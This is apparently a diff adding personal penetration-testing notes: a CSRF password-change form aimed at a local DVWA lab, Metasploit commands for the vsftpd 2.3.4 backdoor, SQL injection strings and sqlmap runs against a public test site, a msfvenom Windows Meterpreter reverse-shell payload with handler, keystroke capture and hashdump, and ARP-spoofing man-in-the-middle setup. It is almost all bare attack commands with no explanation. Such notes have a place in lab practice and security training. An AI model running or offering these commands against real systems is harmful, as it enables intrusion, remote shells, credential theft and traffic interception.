@@ -1,0 +1,42 @@
+<form action="http://192.168.1.10/dvwa/vulnerabilities/csrf/" method="GET"> New Password:<br>
+<input type="password" AUTOCOMPLETE="on" name="password_new" value="dvs"><br>
+Confirm New Password: <br>
+<input type="password" AUTOCOMPLETE="on" name="password_conf" value="dvs">
+<br>
+<input type="Submit" value="Change" name="Change">
+</form>
+
+nmap -sV -A <MET IP>
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST <MET IP>
+exploit
+background
+options
+sessions -i 1
+shell commands mkdir,ls,ifconfig,pwd
+
+1' OR '1'='1
+SELECT * FROM users WHERE id=1' OR '1'='1
+1' UNION SELECT null, table_name FROM information_schema.tables#
+1' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='SCHEMATA
+For testphp.vulnweb.com
+http://testphp.vulnweb.com/artists.php?artist=1 OR 1=1--
+sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data="uname=test&pass=test"
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= <ATT IP> LPORT=<ATT PORT> -f exe -o filename.exe
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ATT IP>
+set LPORT <PORT>
+exploit
+python3 -m http.server 9090
+sysinfo 
+keyscan_dump
+keyscan_start
+hashdump
+
+manual MITM 
+echo "1" > proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+arpspoof -t <Victim_IP><Gateway_IP>
